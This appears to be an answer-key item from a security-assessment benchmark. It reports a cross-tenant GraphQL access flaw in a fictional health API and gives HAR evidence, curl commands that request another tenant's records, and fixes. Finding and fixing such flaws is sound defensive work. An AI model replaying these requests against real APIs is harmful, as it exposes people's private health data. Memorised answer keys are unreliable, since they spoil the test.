# Expected Response

## System
- **Name:** VitalTrack Health API
- **Domain:** Fitness / Wearables
- **Example ID:** GQL-0031
- **Architecture:** FHIR + GraphQL + BLE bridge

---

## Priority Findings

### Finding 1 — GraphQL BOLA: Cross-Tenant Health Data Access via Bulk Lookup (Pattern 1.10 — Cross-service identity propagation drift)
**Severity:** Critical
**Affected endpoint:** `POST https://api.vitaltrack-health-ap.example.com/graphql` (mutation `bulkResourceLookup`)
**Referenced in context:** Section 4.0 (RISK-GQL-031), Section 5.0 (Pattern 1.10), HAR trace

**Summary:**
Pattern 1.10 refers to a scenario where the identity/tenancy context established at one service layer is not consistently propagated to downstream resolvers — the tenantId from the JWT is validated at the gateway layer but not enforced at the resolver level where data is fetched. The `bulkResourceLookup` mutation (Section 4.0) accepts an arbitrary ID array and fetches from any tenant, ignoring the JWT's `tenantId` claim when filtering database results.

In a fitness/wearables context, this means an attacker from `tenant-ad43` can access the personal health data (`sensitiveField`) of users belonging to `tenant-765b`, which may include FHIR-standard health metrics, biometrics, or wearable sensor readings.

**Evidence from HAR:**
- Request header `x-tenant-id: tenant-ad43` — attacker's tenant
- Request mutation: `bulkResourceLookup(ids: ["R-2031", "R-1031", "R-3031"])` — includes cross-tenant resources
- Response: `200 OK`, `x-request-id: req-ad43765b`
- Response body: `tenantId: "tenant-765b"` — victim tenant's fitness data returned
- Response body: `sensitiveField: "CONFIDENTIAL-ad43765b"`, `internalNotes: "Internal data exposed"` — health/wearable data from different tenant

---

### Finding 2 — `getResource` Cross-Tenant Access (same missing guard)
**Severity:** Critical
**Affected endpoint:** `POST https://api.vitaltrack-health-ap.example.com/graphql` (query `getResource`)
**Referenced in context:** Section 4.0 (RISK-GQL-031)

**Summary:**
RISK-GQL-031 confirms `getResource` resolver also lacks the `tenantId` predicate.

---

## Steps to Reproduce

**Step 1 — Baseline (attacker's own tenant)**
```bash
curl -s -X POST https://api.vitaltrack-health-ap.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-ad43" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-1031\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
Expected baseline: `tenantId: "tenant-ad43"` — attacker's own health records.

**Step 2 — Cross-tenant bulk access (exact HAR replay)**
```bash
curl -s -X POST https://api.vitaltrack-health-ap.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-ad43" \
  -d '{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2031\", \"R-1031\", \"R-3031\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome (confirmed by HAR):**
- Response: `200 OK`
- Response includes `tenantId: "tenant-765b"` — cross-tenant health data returned
- `sensitiveField: "CONFIDENTIAL-ad43765b"` — personal health/wearable data from another tenant

**Secure outcome:** Only resources with `tenantId = "tenant-ad43"` returned; cross-tenant entries filtered.

---

## Remediation

1. **Enforce consistent identity propagation:** At every resolver boundary, re-derive `tenantId` from the JWT claim rather than trusting the object chain. Add `AND tenant_id = $jwtTenantId` to all resolver queries.

2. **Bulk filter by JWT tenant:** `bulkResourceLookup` must filter by `tenant_id = $jwtTenantId` — return only the caller's data.

3. **Cache key includes tenant dimension** (Section 2.0): Redis key should be `resourceId:tenantId`.
